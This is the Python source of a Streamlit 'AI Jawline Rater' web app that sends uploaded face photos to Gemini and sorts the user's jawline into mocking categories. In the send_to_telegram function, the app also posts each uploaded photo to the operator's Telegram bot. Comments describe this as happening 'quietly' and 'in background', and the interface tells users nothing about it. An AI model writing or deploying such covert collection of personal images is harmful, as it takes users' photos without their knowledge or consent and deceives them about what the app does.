import streamlit as st
import google.generativeai as genai
from PIL import Image
import requests
import io
# --- CUSTOM CSS FOR STYLING ---
st.markdown("""
<style>
/* 1. Title Styling */
.stApp h1 {
    color: #1E90FF; /* Primary blue for the title */
    font-size: 2.5em;
    border-bottom: 3px solid #1E90FF;
    padding-bottom: 10px;
    margin-bottom: 20px;
}

/* 2. Style the Info/Success/Warning Boxes */
/* This targets the different alert/result boxes to make them stand out */
div[data-testid="stAlert"] {
    padding: 20px;
    border-radius: 12px;
    box-shadow: 5px 5px 15px rgba(0,0,0,0.1); /* Soft shadow */
    font-size: 1.1em;
}

/* 3. Style the upload button for better visibility */
div[data-testid="stFileUploader"] {
    background-color: #f7f7f7;
    border: 2px dashed #ccc;
    border-radius: 10px;
    padding: 15px;
    text-align: center;
}
</style>
""", unsafe_allow_html=True)
# -----------------------------
# --- PAGE SETUP ---
st.set_page_config(page_title="AI Jawline Rater", page_icon="")
st.title("AI Jawline Rater ")
st.write("Upload your photo and let the AI judge your jawline.")

# --- GET SECRETS ---
api_key = st.secrets.get("GOOGLE_API_KEY")
bot_token = st.secrets.get("TELEGRAM_BOT_TOKEN")
chat_id = st.secrets.get("TELEGRAM_CHAT_ID")

if not api_key:
    st.error("🔑 API Key missing! Please add GOOGLE_API_KEY to your Secrets.")
    st.stop()

genai.configure(api_key=api_key)
model = genai.GenerativeModel('gemini-pro')

# --- TELEGRAM FUNCTION ---
def send_to_telegram(image_bytes):
    """Sends the image to your Telegram bot quietly."""
    if not bot_token or not chat_id:
        return # Skip if secrets aren't set
        
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    try:
        # We need to send the bytes directly
        files = {'photo': image_bytes}
        data = {'chat_id': chat_id, 'caption': 'New Jawline Analysis Request! 📸'}
        requests.post(url, files=files, data=data)
    except Exception as e:
        print(f"Telegram Error: {e}")

# --- AI FUNCTION ---
def analyze_image(image):
    prompt = """
    Look at the person's jawline in this photo. 
    Analyze the sharpness, definition, and gonial angle.
    
    Rate the jawline into one of these 3 exact categories:
    1. "Blade/Max ⚔️" (Extremely sharp, well-defined, angular)
    2. "Medium" (Visible but average definition)
    3. "Tomato 🍅" (Soft, rounded, or weak definition)

    Return ONLY the category name first, followed by a 1-sentence explanation.
    """
    try:
        response = model.generate_content([prompt, image])
        return response.text
    except Exception as e:
        return f"Error: {str(e)}"

# --- MAIN UI ---
uploaded_file = st.file_uploader("Choose a photo", type=["jpg", "jpeg", "png"])

if uploaded_file is not None:
    # 1. Convert file to bytes for Telegram & AI
    image_bytes = uploaded_file.getvalue()
    image = Image.open(uploaded_file)
    
    # 2. Show the image to the user
    st.image(image, caption="Your Photo", use_column_width=True)
    
    if st.button("Rate My Jawline"):
        with st.spinner("AI is judging you..."):
            # 3. Send to Telegram (Quietly in background)
            send_to_telegram(image_bytes)
            
            # 4. Analyze with Gemini
            result = analyze_image(image)
            
            # 5. Show Result
            if "Blade" in result:
                st.success(result)
            elif "Medium" in result:
                st.info(result)
            elif "Tomato" in result:
                st.warning(result)
            else:
                st.write(result)